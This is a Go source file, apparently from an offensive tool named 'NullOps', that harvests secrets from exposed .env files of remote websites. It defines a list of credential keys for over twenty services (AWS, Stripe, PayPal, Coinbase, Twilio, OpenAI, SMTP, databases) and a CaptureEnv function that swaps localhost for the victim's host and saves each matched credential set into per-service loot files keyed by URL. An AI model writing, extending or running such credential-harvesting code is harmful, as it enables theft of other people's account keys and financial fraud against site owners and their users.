package Helpers

import (
	"NullOps/CLI_Handlers"
	"fmt"
	"strings"
)

type EnvParser struct {
	Keys    []string
	Results []string
}

func NewEnvParser(keys ...string) *EnvParser {
	return &EnvParser{
		Keys: keys,
	}
}

type AppConfig struct {
	OutputDir string
	Parsers   map[string][]string
}

func NewAppConfig() AppConfig {
	return AppConfig{
		OutputDir: OutputPath, // Define your output directory here
		Parsers: map[string][]string{
			"Database":  {"DB_HOST", "DB_PORT", "DB_USERNAME", "DB_PASSWORD", "DB_DATABASE"},
			"SMTP":      {"MAIL_HOST", "MAIL_PORT", "MAIL_USERNAME", "MAIL_PASSWORD"},
			"SMTP 2":    {"MAIL_DRIVER", "MAIL_HOST", "MAIL_PORT", "MAIL_USERNAME", "MAIL_PASSWORD", "MAIL_ENCRYPTION"},
			"AWS":       {"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_DEFAULT_REGION", "AWS_BUCKET", "AWS_URL"},
			"Coinbase":  {"COINBASE_API_KEY", "COINBASE_API_VERSION", "COINBASE_WEBHOOK_SECRET", "COINBASE_WEBHOOK_URI", "COINBASE_ENABLED"},
			"Stripe":    {"STRIPE_KEY", "STRIPE_SECRET"},
			"Twilio":    {"TWILIO_SID", "TWILIO_AUTH_TOKEN", "TWILIO_VERIFY_SID", "VALID_TWILIO_NUMBER"},
			"Recaptcha": {"RECAPTCHA_SITE_KEY", "RECAPTCHA_SECRET_KEY"},
			"Paypal":    {"PAYPAL_CLIENT_ID", "PAYPAL_CLIENT_SECRET"},
			"Nexmo":     {"NEXMO_KEY", "NEXMO_SECRET"},
			"Google":    {"GOOGLE_CLIENT_ID", "GOOGLE_CLIENT_SECRET"},
			"Facebook":  {"FACEBOOK_CLIENT_ID", "FACEBOOK_CLIENT_SECRET"},
			"Razor":     {"RAZOR_KEY", "RAZOR_SECRET"},
			"Paystack":  {"PAYSTACK_PUBLIC_KEY", "PAYSTACK_SECRET_KEY"},
			"Payfast":   {"PAYFAST_MERCHANT_ID", "PAYFAST_MERCHANT_KEY"},
			"Payhere":   {"PAYHERE_MERCHANT_ID", "PAYHERE_SECRET", "PAYHERE_CURRENCY"},
			"Ngenius":   {"NGENIUS_OUTLET_ID", "NGENIUS_API_KEY", "NGENIUS_CURRENCY"},
			"Instagram": {"INSTAGRAM_TOKEN", "INSTAGRAM_CLIENT", "INSTAGRAM_SECRET"},
			"Captcha":   {"CAPTCHA_SECRET_KEY", "CAPTCHA_SITE_KEY"},
			"Github":    {"GITHUB_CLIENT_ID", "GITHUB_CLIENT_SECRET"},
			"OpenAI":    {"OPENAI_API_KEY", "OPENAI_ORGANIZATION"},
			"Klarna":    {"KLARNA_CHECKOUT_TEST_MODE", "KLARNA_CHECKOUT_USERNAME", "KLARNA_CHECKOUT_SECRET", "KLARNA_CHECKOUT_API_VERSION"},
			"Zoom":      {"ZOOM_CLIENT_KEY", "ZOOM_CLIENT_SECRET"},
			"Mail":      {"MAIL_USERNAME"},
			"FTP":       {"FTP_HOST", "FTP_PASSWORD", "FTP_USERNAME"},
			"MySQL":     {"MYSQL_USER", "MYSQL_ROOT_PASSWORD", "MYSQL_DATABASE", "MYSQL_PASSWORD"},
		},
	}
}

func (p *EnvParser) Parse(envString string) {
	envMap := make(map[string]string)
	lines := strings.Split(envString, "\n")

	var currentKey, currentValue string
	var inQuote bool

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 {
			continue
		}

		if inQuote {
			currentValue += "\n" + line
			if strings.HasSuffix(line, "\"") {
				inQuote = false
				envMap[currentKey] = strings.Trim(currentValue, "\"")
				currentKey, currentValue = "", ""
			}
		} else {
			parts := strings.SplitN(line, "=", 2)
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				value := strings.TrimSpace(parts[1])

				if strings.HasPrefix(value, "\"") && !strings.HasSuffix(value, "\"") {
					inQuote = true
					currentKey = key
					currentValue = value
				} else {
					envMap[key] = strings.Trim(value, "\"")
				}
			}
		}
	}

	for _, key := range p.Keys {
		if val, ok := envMap[key]; !ok || val == "" {
			return
		}
	}

	var resultItems []string
	for _, key := range p.Keys {
		resultItems = append(resultItems, fmt.Sprintf("%s=%s", key, envMap[key]))
	}

	p.Results = append(p.Results, strings.Join(resultItems, "|"))
}

func CaptureEnv(envString string, url string, config AppConfig) (string, error) {
	outputDir := config.OutputDir
	var capture strings.Builder

	envString = strings.ReplaceAll(envString, "localhost", ExtractHost(url))
	envString = strings.ReplaceAll(envString, "127.0.0.1", ExtractHost(url))
	envString = strings.ReplaceAll(envString, "'", "")

	for typeName, keys := range config.Parsers {
		parser := NewEnvParser(keys...)
		parser.Parse(envString)

		for _, result := range parser.Results {
			if capture.Len() > 0 {
				capture.WriteString(" ")
			}
			capture.WriteString(" " + typeName)

			err := CLI_Handlers.AppendToFile(fmt.Sprintf("%s/Env (%s).txt", outputDir, typeName), []string{
				result,
			})

			if err != nil {
				return "", err
			}
		}
	}

	if capture.Len() == 0 {
		err := CLI_Handlers.AppendToFile(fmt.Sprintf("%s/Env (Empty).txt", outputDir), []string{
			envString,
		})
		if err != nil {
			return "", err // Handle error appropriately
		}
	}

	err := CLI_Handlers.AppendToFile(fmt.Sprintf("%s/Env (All).txt", outputDir), []string{
		fmt.Sprintf("=============================== %v START ===============================", url),
		envString,
		fmt.Sprintf("=============================== %v END ===============================", url),
	})
	if err != nil {
		return "", err // Handle error appropriately
	}

	err = CLI_Handlers.AppendToFile(fmt.Sprintf("%s/Env (No Capture).txt", outputDir), []string{
		url,
	})
	if err != nil {
		return "", err // Handle error appropriately
	}

	return capture.String(), nil
}
